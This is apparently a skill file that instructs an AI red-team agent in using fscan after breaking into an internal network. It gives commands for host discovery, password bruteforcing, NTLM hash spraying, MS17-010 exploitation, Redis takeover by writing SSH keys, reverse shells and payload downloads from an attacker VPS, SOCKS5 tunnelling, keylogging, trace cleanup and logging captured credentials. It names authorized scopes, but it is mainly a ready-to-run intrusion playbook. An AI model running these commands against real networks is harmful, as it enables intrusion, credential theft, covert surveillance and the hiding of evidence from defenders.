---
name: fscan-intranet
description: [Internal] fscan v2.2.1 internal network sweep: liveness probing, port/service identification, 28 categories of weak-password bruteforcing, unauthenticated access and high-risk vulnerabilities (MS17-010/SMBGhost), Redis exploitation and SOCKS5 tunnelling
whenToUse: After entering the intranet (jump host/WebShell/socks5 tunnel), to quickly expand the asset surface, find weak passwords and unauthenticated access, and turn reachability into attackable points
role: internal
category: Internal
tags: [internal, scan, credential]
enabled: true
---

# fscan (internal network sweep with weak-password/vulnerability checks)

`fscan` = **breadth-first intranet census**: throw in a C-segment and within minutes you get live hosts, open ports, service fingerprints, Web titles,
weak passwords, unauthenticated access, high-risk vulnerabilities. **It is noisy**, so it is only suitable for intranets (use the external scanning skill for internet-facing targets).

## Division of labor with gogo

| | fscan | gogo |
| --- | --- | --- |
| Positioning | Comprehensive census + bruteforcing + exploitation | High-performance mapping + fingerprints + information extraction |
| Noise | High (600 threads + bruteforcing + POCs by default) | Controllable (`--opsec`, threads/timeouts tunable) |
| Which first | Clear target, need weak passwords and holes fast | Large segments first for surface coverage, need fingerprints and titles |

**Recommended order**: `gogo` first to cover the surface and get an asset list → then `fscan` for targeted bruteforcing and vulnerability checks against confirmed live targets.

## Binaries

```
Local : $DSH_HOME/redteam/toolkit/fscan/fscan          (v2.2.1, with local plugins)
        $DSH_HOME/redteam/toolkit/fscan/fscan_windows_x64.exe
        $DSH_HOME/redteam/toolkit/fscan/fscan_linux_arm64
VPS   : http://<your VPS_IP>:9100/fscan                 (payload directory of skill vps-reverse-shell)
```

**Transfer to the jump host/target** (intranet scanning must run where the intranet is reachable):

```bash
# Download directly on the jump host (start the payload service on the VPS: ~/.dsh/redteam/toolkit/vps/vps.sh serve 9100)
curl -o fscan http://<your VPS_IP>:9100/fscan && chmod +x fscan
# Or upload from this machine over shells
```

## Discipline (read this first)

1. **Scope**: only use segments from the authorized list; use `-eh/-ehf` to explicitly exclude office networks, printers, ICS, and cloud metadata (169.254.169.254).
2. **Do not knock devices over**: the default `-t 600` is dangerous for legacy devices/ICS. Start with `-t 100 -time 3` on intranets, and raise it only after confirming the devices cope.
3. **No bruteforcing first, then bruteforcing**: in round one use `-nobr -nopoc` for the asset surface only; only open up in round two after confirming target importance and authorization.
4. **Avoid honeypots/IDS**: throttle with `-rate`, cap volume with `-maxpkts`; an administrator may be watching.
5. **DNSLog exfiltration**: `-dns -domain <your dnslog domain>`; do not send sensitive data through public DNSLog services.

## Standard operating procedure (SOP)

```bash
# 0) Confirm where you are and what you can reach
ip a; ip route

# 1) Liveness census (fastest, scope out the live hosts first)
./fscan -h 10.0.0.0/24 -m icmp -o alive.txt -nocolor

# 2) Asset surface (no bruteforcing, no POCs — quietest)
./fscan -h 10.0.0.0/24 -np -nobr -nopoc -t 100 -time 3 -o assets.txt

# 3) Web first: hand the web ports from assets.txt to the screenshot/fingerprint stage
./fscan -h 10.0.0.0/24 -p 80,443,8080,8000,8888,9000,7001,9090 -nobr -nopoc -nocolor

# 4) Targeted bruteforcing (after authorization is confirmed)
./fscan -h 10.0.0.5 -m ssh -user root -pwdf /tmp/pass.txt -t 5

# 5) High-risk vulnerabilities and unauthenticated access
./fscan -h 10.0.0.0/24 -m ms17010,smbghost -nobr
./fscan -h 10.0.0.0/24 -p 6379,27017,9200,11211,2181 -nobr -nopoc
```

## Parameter reference (measured against v2.2.1 `-help`)

**Targets**
```
-h  <IP|CIDR|file|domain>   target (IP range files also work)
-hf <file>                host file        -eh/-ehf  exclude host/exclude file
-u  <URL>  -uf <file>     single URL / URL file     -domain <domain>
```

**Ports and liveness**
```
-p  21,22,80,443,3306,6379,10000-10100    ports (about 150 common ports built in by default)
-pf <file>  port file        -ep exclude ports
-np         disable ping probing (port scan only, faster)      -ao  liveness probing only
-nsp        disable segment pre-filtering (speeds up large segments)          -ntp disable TCP supplementary probing
```

**Modes**
```
-m all        default full pipeline (including bruteforcing + POCs)
-m icmp       liveness only
-m <plugin>   run only the specified service plugin, e.g. -m ssh / -m redis / -m smb2 / -m ms17010 / -m netbios
-nobr         disable bruteforcing   -nopoc disable POCs   -noredis disable Redis exploitation
```

**Concurrency and throttling** (critical for OPSEC)
```
-t 600       port scan threads        -time 3   port timeout (seconds)
-mt 20       module threads           -wt 5     Web timeout
-gt 0        global timeout (seconds) -retry 3  retry count
-rate 0      max packets per minute (0=unlimited)   -maxpkts 0  total packet cap
-num 20      POC concurrency          -icmp-rate 0.1  ICMP rate
```

**Credentials (bruteforcing)**
```
-user/-pwd      single user/password pair          -userf/-pwdf  wordlist files
-upf            user:password pair file            -usera/-pwda  append multiple (comma/space separated)
-hash/-hashf    NTLM hash spraying                 -sshkey       private key login
```

**Exploitation (use once obtained, mind the authorization boundary)**
```
-rf <pubkey>       Redis write public key (write authorized_keys to get SSH)
-rs                Redis Shell        -rwc/-rwf/-rwp  Redis write content/file/path
-rsh <ip:port>     reverse shell to the specified address (pairs with skill vps-reverse-shell)
-sc <shellcode>    MS17-010 ShellCode
-local <plugin>    local plugins: systeminfo / keylogger / cleaner etc. (run on the jump host)
-start-socks5 1080 start a SOCKS5 service on the jump host to expose the intranet to this machine
-fsh-port 4444     forward shell service port
```

**Proxy (the core usage after tunnelling)**
```
-socks5 127.0.0.1:1080                 go through SOCKS5 (suo5 / ssh -D / frp all work)
-socks5 socks5://user:pass@127.0.0.1:1080
-proxy http://127.0.0.1:8080           go through an HTTP proxy
```

**Output**
```
-o result.txt    output file       -f txt|json|csv   format
-no              do not save results   -silent  silent     -nocolor/-nopg  disable color/progress bar
-lang zh|en      language          -log "base,info,success"   log level
-dns             record DNS logs (combined with -domain for exfiltration detection)
-perf            output performance statistics JSON
```

## Key scenarios

### 1. Attack the intranet through a tunnel (most common)

```bash
# Prerequisite: an existing socks5 (skill suo5-tunnel, or ssh -D from vps-reverse-shell)
# Verified in practice: fscan -socks5 really pushes traffic into the tunnel
./fscan -h 10.0.0.0/24 -p 22,80,445,3306,6379 -np -nobr -nopoc \
        -socks5 127.0.0.1:1080 -t 50 -time 5 -o intranet.txt
```

Note: do not set the thread count too high when going through a proxy (the tunnel itself is the bottleneck); around `-t 50` is enough.

### 2. Open a tunnel on the jump host for this machine to use

Run on the jump host (expose intranet 10.x to port 9100 on the VPS, then forward it back via ssh locally):

```bash
./fscan -start-socks5 1080      # jump host:1080 becomes SOCKS5
# Reverse tunnel on the VPS: ssh -R 9200:127.0.0.1:1080 ubuntu@<your VPS_IP>
# Local machine: ssh -L 1080:127.0.0.1:9200 ubuntu@<your VPS_IP>
# Afterwards every tool can use -socks5 127.0.0.1:1080
```

### 3. Take Redis and go straight for access

```bash
./fscan -h 10.0.0.5 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub     # write public key → ssh in
./fscan -h 10.0.0.5 -p 6379 -rs                                  # Redis Shell
./fscan -h 10.0.0.5 -p 6379 -rsh <your VPS_IP>:9000              # call back to the VPS listener
```

### 4. After landing on a server

```bash
./fscan -local systeminfo        # system info, environment variables, domain controller, NICs
./fscan -local keylogger         # keystroke logging (specify output with -keylog-output)
./fscan -local cleaner           # trace cleanup
```

## Persisting results (mandatory)

fscan's txt output is sectioned; parse it and store entry by entry:

```bash
# Each live host
redteam_asset_add  { engagement, ip, source: "fscan", tags: ["internal"] }
# Each open port/service
redteam_asset_add  { engagement, ip, port, service, banner }   # or link with asset_link
# Credentials and access from successful bruteforcing/unauthenticated access
redteam_credential_add { engagement, host, username, secret_type, secret_ref: "runs/fscan-<segment>.txt" }
redteam_access_add     { engagement, host, username, method: "ssh", privilege, session_ref }
# Confirmed vulnerabilities (request/response or equivalent evidence)
redteam_vuln_add   { engagement, target, name: "Redis unauthenticated access", severity: "high", evidence_ref }
```

**Discipline**: the `-o` output file is evidence — copy it back into `runs/`; do not just glance at the terminal and consider it done.

## Troubleshooting

| Symptom | Handling |
| --- | --- |
| Scans stall / extremely slow | Drop `-np`, lower `-t`, raise `-time`; for large segments use `-m icmp` first to scope live hosts |
| Everything looks falsely open | A firewall/load balancer in between replies SYN-ACK; raise `-time` and re-check with `-retry` |
| ICMP fails | Needs root/`CAP_NET_RAW`; use `sudo ./fscan -m icmp`, or switch to `-np` for port scanning only |
| Bruteforcing locked out | Try a small set with `-usera` first and confirm there is no lockout policy (domain accounts are especially dangerous) |
| Garbled Chinese output | `-lang en` or `export LANG=zh_CN.UTF-8` |
| Want it quieter | `-nobr -nopoc -nocolor -nopg -t 50 -rate 6000`, and `-silent` if needed |

## Related skills

- `gogo-intranet`: use it to cover the surface first
- `suo5-tunnel`: WebShell → SOCKS5, providing the `-socks5` entry for fscan
- `vps-reverse-shell`: landing end for `-rsh`, payload delivery
- `webshell-toolkit`: managing WebShells once obtained
